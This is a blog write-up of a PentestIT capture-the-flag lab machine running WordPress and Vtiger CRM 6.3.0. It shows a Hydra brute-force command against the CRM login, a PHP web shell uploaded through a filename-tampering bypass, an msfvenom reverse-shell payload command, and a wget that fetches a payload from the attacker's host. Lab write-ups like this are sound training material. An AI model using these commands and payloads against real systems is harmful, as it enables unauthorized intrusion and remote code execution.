---
layout: post
title:  "PentestIT Lab v11 - CRM"
date:   2018-03-04 00:46:00 -0800
categories: Pentesting CTF
---
Opening the browser and going to 192.168.101.10 (TCP port 80), shows a welcome page for the lab. This seems to be a blog, and further look into the HTML code, I can see references to Wordpress links. Using WPscan, I learn this site is running the Kittycatfish plugin, which is vulnerable to a SQLi ([WordPress Plugin KittyCatfish 2.2 - SQL Injection][kittycatfish_vuln]). My attempts to exploit this, either manually or through SQLmap, are unsuccessful. I suspect there's some WAF in the middle as I'm getting forbidden responses when using SQLi attempts and also when bruteforcing the Wordpress admin login form. I move on to find something else as with an WAF in the middle, it will be difficult.

From the HTML code, I see a link to http://192.168.101.10:88. Going to the link, I can see there's a Vtiger 6.3.0 web application. Further research, tells me this version is vulnerable to an [Authenticated Remote Code Execution][vtiger_vuln]. Through some web searching, I learn the default credentials are admin:admin, however, I get a invalid username or password. Time to brute force the admin's password.

I launch Burp and configure my browser to use it has a proxy. I then submit the login form with admin:admin credentials. From the Burp history, I get the POST data and the URL path I need to use. I then launch Hydra with the rockyou-60.txt wordlist from [Seclists][seclists]:

{% highlight bash %}
hydra 192.168.101.10 -s 88 http-post-form "/index.php?module=Users&action=Login:__vtrftk=sid%3A0e9ffbd5aee2325cb3254c8d41253bbd7c4bd27a%2C1518930935&username=^USER^&password=^PASS^:error=1" -l admin -P rockyou-60.txt -t 20
{% endhighlight %}

In this login form, when the login fails, you get a 302 redirect to the login page again with the message "Invalid username or password". However, Hydra doesn't follow redirects, but I've noticed that on the 302 response, the Location header contains a error=1 parameter. That's why I'm using it has the failed string.

Going back to the password brute force, after several minutes, Hydra spits the known password: <b>blackstar</b>. Now, with an authenticated session in the Vtiger CRM application, I can try to use the previous exploit found:

I create a file 1.php with the content: {% highlight php %}<? passthru($_GET['cmd']); ?>{% endhighlight %}

This uses the PHP short tags, as the application is checking if the content contains <?php.

I then go to Settings(Small gear on the top right) -> CRM Settings -> Templates -> Company Details -> Edit. I then click the Browse button to add my 1.php file, but first, I set Burp to intercept the form submit. However, there seems to be some Javascript to detect the file extension, which only permits images. I then change my 1.php to 1.jpg and submit the form again, this time with Burp intercept off. I then go to Burp's history and send that POST request to Repeater. I then change the content of the filename from 1.jpg to 1.php and send the request again, maintaing the content type as jpeg:

{% highlight php %}
...
CompanyDetailsSave
-----------------------------2787963551806245971250936184
Content-Disposition: form-data; name="logo"; filename="1.php"
Content-Type: image/jpeg

<? passthru($_GET['cmd']); ?>
...
{% endhighlight %}

Accessing the URL path <code>/test/logo/1.php?cmd=whoami</code>, will tell me that I'm running with www-data user. Sending <code>/test/logo/1.php?cmd=uname -a</code>, I can see this is a Debian Linux system.

Now it's time to get a proper foothold into the system, so I can start doing proper enumeration. I generate a meterpreter with command:

{% highlight bash %}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<MY_VPN_IP> LPORT=443 -f elf > 1.elf
{% endhighlight %}

Launch a <code>python -m SimpleHTTPServer</code> to serve the meterpreter and from the browser execute <code>/test/logo/1.php?cmd=wget http://MY_IP:8000/1.elf -O /tmp/1.elf</code>. However, I get a gateway timeout, looks like the server is not allowing egress connections to TCP port 8000. I then tried with TCP port 80 and still no connection. Tried ping (<code>test/logo/1.php?cmd=ping -c1 -w1 MY_IP</code>), and I get no response, so in the end, it looks like there's more restrictions on the egress traffic. Looking at the file /etc/iptables.save (<code>/test/logo/1.php?cmd=cat /etc/iptables.save</code>), I can see it's allowing egress traffic only to 172.16.0.11 and 172.16.0.254:

<pre>
# Generated by iptables-save v1.4.14 on Thu Jul  4 02:14:19 2013
*filter
:INPUT ACCEPT [194:23274]
:FORWARD ACCEPT [1268:354653]
:OUTPUT ACCEPT [155:40731]

## state,lo
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -i lo -j ACCEPT

## icmp
-A INPUT -p icmp --icmp-type 8 -j ACCEPT

## ssh
-A INPUT -p tcp --dport 22 -j ACCEPT

## www
-A INPUT -p tcp --dport 80 -j ACCEPT

### DROP OTHER
-A INPUT -j DROP

## OUT
-A OUTPUT -d 172.16.0.11 -j ACCEPT
-A OUTPUT -d 172.16.0.254 -j ACCEPT

-A OUTPUT -d 172.16.0.0/24 -j DROP
</pre>

At this point, my only option was to enumerate using the web shell. I've noticed that after a few minutes, my shell was gone, so I had to upload it again. Having the request ready in Burp Repeater was handy, because I had to upload the web shell many times.

From the webshell I go to <code>/var/www/rce_token.txt</code> and get the CRM token.

[kittycatfish_vuln]: https://www.exploit-db.com/exploits/41919/
[vtiger_vuln]: https://www.exploit-db.com/exploits/38345/
[seclists]: https://github.com/danielmiessler/SecLists/tree/master/Passwords
